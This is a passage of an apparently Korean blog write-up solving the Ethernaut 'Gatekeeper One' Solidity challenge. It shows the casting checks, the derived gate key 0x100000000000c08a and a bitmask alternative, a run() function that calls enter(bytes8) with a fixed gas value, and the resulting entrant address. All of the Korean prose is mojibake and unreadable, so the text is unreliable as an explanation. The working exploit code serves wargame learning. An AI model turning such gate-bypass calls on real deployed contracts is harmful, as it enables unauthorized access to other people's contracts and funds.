ë™ì¼í•œ ê°’ì„ uint32ì™€ uint16ìœ¼ë¡œ íƒ€ì… ìºìŠ¤íŒ…ì„ í•œ ê²ƒì´ ê°™ë‹¤ë©´ ì‘ì€ íƒ€ì… uint16(16ë¹„íŠ¸) ì´ë‚´ì˜ ê°’ì´ ë™ì¼í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ë‹¤ìŒ ì‹ì€ trueì…ë‹ˆë‹¤.
ì¦‰ íƒ€ì… ìºìŠ¤íŒ…ì´ ë˜ë”ë¼ë„ ì–´ì°¨í”¼ 16ë¹„íŠ¸ ë²”ìœ„ ë‚´ì˜ ê°’ì´ë¯€ë¡œ ê°™ì€ ê°’ì´ ë˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

{% highlight html %}
uint32 data = 0x00001111;
uint16(data) == data; //true
{% endhighlight %}

í•˜ì§€ë§Œ ë‹¨ í•œ ë¹„íŠ¸ë¼ë„ ë²”ìœ„ë¥¼ ë„˜ì–´ì„œë©´ íƒ€ì… ìºìŠ¤íŒ…í•œ ê²°ê³¼ëŠ” ë‹¤ë¥¼ ìˆ˜ ë°–ì— ì—†ìŠµë‹ˆë‹¤.

{% highlight html %}
uint32 data = 0x10001111;
uint16(data) == data; //false
{% endhighlight %}

ê²°êµ­ gateKeyëŠ” bytes8ë¡œ 64ë¹„íŠ¸ì¸ë° ê·¸ ì¤‘ì— í•˜ìœ„ 32ë¹„íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì„ ê²ƒì…ë‹ˆë‹¤.

{% highlight html %}
address metamask_account = 0xAFc4F9F3bA806dd2F8e47A524fFDa2418bBFc08a; //tx.origin
uint16(metamask_account) = 49290
{% endhighlight %}

ê·¸ë ‡ë‹¤ë©´ ë‚˜ë¨¸ì§€ ìƒìœ„ 32ë¹„íŠ¸ëŠ” ì–´ë–»ê²Œ ì•Œ ìˆ˜ ìˆì„ê¹Œìš”? ë‹¤ìŒ ì¡°ê±´ì„ ë´…ì‹œë‹¤.

{% highlight javascript %}
require(uint32(_gateKey) != uint64(_gateKey));

{% endhighlight %}

ì´ ì¡°ê±´ì€ `require(uint32(_gateKey) == uint16(_gateKey))`ì™€ ë°˜ëŒ€ë¼ê³  ìƒê°í•˜ë©´ ë˜ê² ìŠµë‹ˆë‹¤. ì¦‰ ë™ì¼í•œ ê°’ì„ ì„œë¡œ ë‹¤ë¥¸ íƒ€ì…ìœ¼ë¡œ ìºìŠ¤íŒ…í•˜ë©´
ë‹¤ë¥´ë‹¤ëŠ” ê²ƒì¸ë° ì´ê²ƒì€ ìƒìœ„ 32ë¹„íŠ¸ ë‚´ì— 0ì´ ì•„ë‹Œ ê²ƒì´ ë°˜ë“œì‹œ í•œ ë¹„íŠ¸ë¼ë„ ìˆë‹¤ëŠ” ë§ì´ ë˜ê² ìŠµë‹ˆë‹¤.

49290ì„ bytes8ë¡œ ë°”ê¾¸ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

{% highlight html %}
bytes8(49290) = 0x XXXX XXXX 0000 c08a
{% endhighlight %}

ì—¬ê¸°ì„œ XëŠ” ëª¨ë‘ 0ì´ ì•„ë‹ˆë©´ ì–´ë–¤ ê°’ì´ë¼ë„ ìƒê´€ì—†ê² ìŠµë‹ˆë‹¤. ì¤‘ìš”í•œ ê²ƒì€ ë§ˆì§€ë§‰ í•˜ìœ„ 16ë¹„íŠ¸ê°€ ì¤‘ìš”í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ìµœì¢…ì ì¸ ë©”ì†Œë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

{% highlight javascript %}

function run() public {
    gateKey = 0x100000000000c08a;
    bool bOk = address(gateKeeper).call.gas(819315)(bytes4(keccak256("enter(bytes8)")), gateKey);
    if (!bOk) {
        revert();
    }
}
{% endhighlight %}

ê²°ê³¼ë¥¼ í™•ì¸í•©ë‹ˆë‹¤.

{% highlight html %}
await contract.entrant()
"0xafc4f9f3ba806dd2f8e47a524ffda2418bbfc08a"
{% endhighlight %}

ì°¸ê³ ì ìœ¼ë¡œ &ì—°ì‚°ì„ í†µí•œ ë¹„íŠ¸ ë§ˆìŠ¤í‚¹ì„ í†µí•´ì„œë„ êµ¬í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë¬¼ë¡  ì—¬ê¸°ì„œ ìƒìœ„ 32ë¹„íŠ¸ ë§ˆìŠ¤í¬ëŠ” ì–´ëŠ í•œ ë¹„íŠ¸ë¼ë„ 1ì´ ì¡´ì¬í•˜ë©´ ë˜ê² ìŠµë‹ˆë‹¤(0xF0000000000FFFF, 0x0F000000000FFFF ë“±ë“± ëª¨ë‘ ê°€ëŠ¥).

{% highlight javascript %}
bytes8 gateKey = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;
{% endhighlight %}

[ethernaut]: https://ethernaut.zeppelin.solutions/


